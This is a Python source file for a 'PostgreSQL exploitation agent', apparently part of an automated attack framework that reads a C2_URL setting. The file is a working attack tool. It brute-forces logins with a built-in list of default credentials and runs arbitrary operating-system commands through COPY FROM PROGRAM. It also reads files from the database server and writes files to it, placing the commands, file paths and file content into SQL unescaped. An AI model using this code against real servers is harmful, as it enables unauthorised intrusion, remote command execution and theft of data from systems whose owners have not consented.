"""
PostgreSQL Exploitation Agent
Complete PostgreSQL penetration testing capabilities
"""

import asyncio
import os
from typing import Dict, List, Optional
import logging

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log

logger = logging.getLogger(__name__)


class PostgreSQLExploitAgent(BaseAgent):
    """
    PostgreSQL exploitation agent with multiple attack vectors
    
    Features:
    - Brute force authentication
    - Default credentials testing
    - SQL injection exploitation
    - Privilege escalation
    - Command execution via COPY TO/FROM PROGRAM
    - File read/write operations
    - UDF injection
    """
    
    supported_phases = [AttackPhase.EXPLOITATION, AttackPhase.POST_EXPLOITATION]
    required_tools = ["psycopg2"]
    
    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.c2_url = os.getenv('C2_URL', 'http://localhost:8000')
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "bruteforce", "exploit", "execute", "read_file", "write_file"
            context: {
                "host": target host,
                "port": target port (default: 5432),
                "username": username for auth,
                "password": password for auth,
                "database": database name (default: postgres),
                "command": command to execute,
                "file_path": file path for read/write operations
            }
        
        Returns:
            AgentData with exploitation results
        """
        log.info(f"[PostgreSQLExploit] {directive}")
        
        try:
            host = context.get("host")
            port = context.get("port", 5432)
            
            if not host:
                return AgentData(
                    agent_name="PostgreSQLExploit",
                    success=False,
                    data={"error": "Host is required"}
                )
            
            if directive == "scan":
                result = await self.scan_postgresql(host, port)
            
            elif directive == "bruteforce":
                database = context.get("database", "postgres")
                result = await self.bruteforce(host, port, database)
            
            elif directive == "exploit":
                username = context.get("username")
                password = context.get("password")
                database = context.get("database", "postgres")
                result = await self.exploit(host, port, username, password, database)
            
            elif directive == "execute":
                username = context.get("username")
                password = context.get("password")
                database = context.get("database", "postgres")
                command = context.get("command")
                result = await self.execute_command(host, port, username, password, database, command)
            
            elif directive == "read_file":
                username = context.get("username")
                password = context.get("password")
                database = context.get("database", "postgres")
                file_path = context.get("file_path")
                result = await self.read_file(host, port, username, password, database, file_path)
            
            elif directive == "write_file":
                username = context.get("username")
                password = context.get("password")
                database = context.get("database", "postgres")
                file_path = context.get("file_path")
                content = context.get("content", "")
                result = await self.write_file(host, port, username, password, database, file_path, content)
            
            else:
                result = await self.scan_postgresql(host, port)
            
            return AgentData(
                agent_name="PostgreSQLExploit",
                success=result.get("success", False),
                data=result
            )
        
        except Exception as e:
            log.error(f"[PostgreSQLExploit] Error: {e}")
            return AgentData(
                agent_name="PostgreSQLExploit",
                success=False,
                data={"error": str(e)}
            )
    
    async def scan_postgresql(self, host: str, port: int = 5432) -> Dict:
        """Scan PostgreSQL service"""
        
        log.info(f"[PostgreSQLExploit] Scanning {host}:{port}")
        
        try:
            import psycopg2
            
            # Try to connect without credentials
            try:
                conn = psycopg2.connect(
                    host=host,
                    port=port,
                    database="postgres",
                    user="postgres",
                    password="",
                    connect_timeout=5
                )
                conn.close()
                
                return {
                    "success": True,
                    "vulnerable": True,
                    "message": "PostgreSQL accessible without password"
                }
            except:
                pass
            
            # Check if service is running
            try:
                conn = psycopg2.connect(
                    host=host,
                    port=port,
                    database="postgres",
                    user="invalid_user",
                    password="invalid_pass",
                    connect_timeout=5
                )
            except psycopg2.OperationalError as e:
                error_msg = str(e)
                
                if "authentication failed" in error_msg.lower():
                    return {
                        "success": True,
                        "service_running": True,
                        "message": "PostgreSQL service is running"
                    }
                else:
                    return {
                        "success": False,
                        "error": "PostgreSQL service not accessible"
                    }
        
        except ImportError:
            return {
                "success": False,
                "error": "psycopg2 not installed. Install with: pip install psycopg2-binary"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def bruteforce(self, host: str, port: int, database: str = "postgres") -> Dict:
        """Brute force PostgreSQL authentication"""
        
        log.info(f"[PostgreSQLExploit] Brute forcing {host}:{port}")
        
        # Common PostgreSQL credentials
        credentials = [
            ("postgres", "postgres"),
            ("postgres", "password"),
            ("postgres", "admin"),
            ("postgres", ""),
            ("admin", "admin"),
            ("postgres", "123456"),
            ("postgres", "root"),
            ("postgres", "postgres123")
        ]
        
        try:
            import psycopg2
            
            for username, password in credentials:
                try:
                    conn = psycopg2.connect(
                        host=host,
                        port=port,
                        database=database,
                        user=username,
                        password=password,
                        connect_timeout=5
                    )
                    
                    conn.close()
                    
                    log.success(f"[PostgreSQLExploit] Valid credentials: {username}:{password}")
                    
                    return {
                        "success": True,
                        "username": username,
                        "password": password,
                        "database": database
                    }
                
                except psycopg2.OperationalError:
                    continue
            
            return {
                "success": False,
                "message": "No valid credentials found"
            }
        
        except ImportError:
            return {
                "success": False,
                "error": "psycopg2 not installed"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def exploit(self, host: str, port: int, username: str, 
                     password: str, database: str = "postgres") -> Dict:
        """Exploit PostgreSQL with valid credentials"""
        
        log.info(f"[PostgreSQLExploit] Exploiting {host}:{port}")
        
        try:
            import psycopg2
            
            conn = psycopg2.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            cur = conn.cursor()
            
            # Get version
            cur.execute("SELECT version();")
            version = cur.fetchone()[0]
            
            # Get current user
            cur.execute("SELECT current_user;")
            current_user = cur.fetchone()[0]
            
            # Check if superuser
            cur.execute("SELECT usesuper FROM pg_user WHERE usename = current_user;")
            is_superuser = cur.fetchone()[0]
            
            # List databases
            cur.execute("SELECT datname FROM pg_database;")
            databases = [row[0] for row in cur.fetchall()]
            
            # List tables
            cur.execute("SELECT tablename FROM pg_tables WHERE schemaname = 'public';")
            tables = [row[0] for row in cur.fetchall()]
            
            cur.close()
            conn.close()
            
            result = {
                "success": True,
                "version": version,
                "current_user": current_user,
                "is_superuser": is_superuser,
                "databases": databases,
                "tables": tables
            }
            
            log.success(f"[PostgreSQLExploit] Exploitation successful")
            
            return result
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def execute_command(self, host: str, port: int, username: str,
                             password: str, database: str, command: str) -> Dict:
        """Execute system command via COPY TO PROGRAM"""
        
        log.info(f"[PostgreSQLExploit] Executing command: {command}")
        
        try:
            import psycopg2
            
            conn = psycopg2.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            cur = conn.cursor()
            
            # Create temporary table
            cur.execute("CREATE TEMP TABLE cmd_output (output text);")
            
            # Execute command via COPY TO PROGRAM
            query = f"COPY cmd_output FROM PROGRAM '{command}';"
            cur.execute(query)
            
            # Get output
            cur.execute("SELECT * FROM cmd_output;")
            output = "\n".join([row[0] for row in cur.fetchall()])
            
            cur.close()
            conn.close()
            
            log.success(f"[PostgreSQLExploit] Command executed successfully")
            
            return {
                "success": True,
                "output": output
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def read_file(self, host: str, port: int, username: str,
                       password: str, database: str, file_path: str) -> Dict:
        """Read file from filesystem"""
        
        log.info(f"[PostgreSQLExploit] Reading file: {file_path}")
        
        try:
            import psycopg2
            
            conn = psycopg2.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            cur = conn.cursor()
            
            # Read file via COPY
            cur.execute("CREATE TEMP TABLE file_content (content text);")
            cur.execute(f"COPY file_content FROM '{file_path}';")
            
            cur.execute("SELECT * FROM file_content;")
            content = "\n".join([row[0] for row in cur.fetchall()])
            
            cur.close()
            conn.close()
            
            log.success(f"[PostgreSQLExploit] File read successfully")
            
            return {
                "success": True,
                "content": content
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def write_file(self, host: str, port: int, username: str,
                        password: str, database: str, file_path: str, content: str) -> Dict:
        """Write file to filesystem"""
        
        log.info(f"[PostgreSQLExploit] Writing file: {file_path}")
        
        try:
            import psycopg2
            
            conn = psycopg2.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            cur = conn.cursor()
            
            # Write file via COPY
            cur.execute("CREATE TEMP TABLE file_data (data text);")
            cur.execute(f"INSERT INTO file_data VALUES ('{content}');")
            cur.execute(f"COPY file_data TO '{file_path}';")
            
            cur.close()
            conn.close()
            
            log.success(f"[PostgreSQLExploit] File written successfully")
            
            return {
                "success": True,
                "message": f"File written to {file_path}"
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }


# Standalone execution
if __name__ == "__main__":
    async def main():
        agent = PostgreSQLExploitAgent()
        result = await agent.run("scan", {"host": "localhost", "port": 5432})
        print(result)
    
    asyncio.run(main())

